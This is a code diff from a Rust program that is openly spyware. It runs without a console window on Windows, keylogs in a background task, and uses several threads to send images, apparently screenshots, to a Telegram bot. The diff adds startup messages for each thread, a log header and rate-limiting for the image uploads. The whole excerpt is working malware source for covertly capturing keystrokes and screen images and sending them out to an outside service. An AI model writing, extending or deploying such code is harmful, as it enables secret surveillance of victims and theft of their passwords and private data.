@@ -1,5 +1,6 @@
 #![windows_subsystem = "windows"]
 
+use std::cmp::max;
 use std::fmt::format;
 use std::ops::Sub;
 use std::sync::mpsc::Sender;
@@ -29,9 +30,10 @@ async fn run() {
 
     // keylogging
     tokio::spawn(async move {
-        let mut client = TelegramClient::from_env().await;
+        let mut client = TelegramClient::from_env("start key logger".to_string()).await;
         let mut last_time = SystemTime::now();
         let mut print = Vec::new();
+        print.push("[LOGS]\n".to_string());
         loop {
             let add_vec = do_logging();
             for i in add_vec {
@@ -54,6 +56,8 @@ async fn run() {
     });
 
     let start = SystemTime::now();
+
+    // image sending
     let (req_sender, mut req_receiver) = mpsc::channel::<oneshot::Sender<String>>(32);
     tokio::spawn(async move {
         let mut last_time = SystemTime::now().sub(Duration::from_millis(1000000));
@@ -63,6 +67,10 @@ async fn run() {
                 responder.send("ok".to_string());
             } else {
                 responder.send("no".to_string());
+                let sleep_duration = SEND_PHOTO_INTERVAL_MILLIS - SystemTime::now().duration_since(last_time).unwrap().as_millis();
+                if (sleep_duration > 10) {
+                    tokio::time::sleep(Duration::from_millis((sleep_duration - 10) as u64));
+                }
             }
         }
     });
@@ -70,7 +78,7 @@ async fn run() {
     for i in 0..NUMBER_OF_THREADS {
         let cur_req_sender = req_sender.clone();
         tokio::spawn(async move {
-            let mut client = TelegramClient::from_env().await;
+            let mut client = TelegramClient::from_env(format!("start image sender {}/{}", i + 1, NUMBER_OF_THREADS)).await;
             loop {
                 let (perm_sender, perm_receiver) = oneshot::channel::<String>();
                 cur_req_sender.send(perm_sender).await.unwrap();
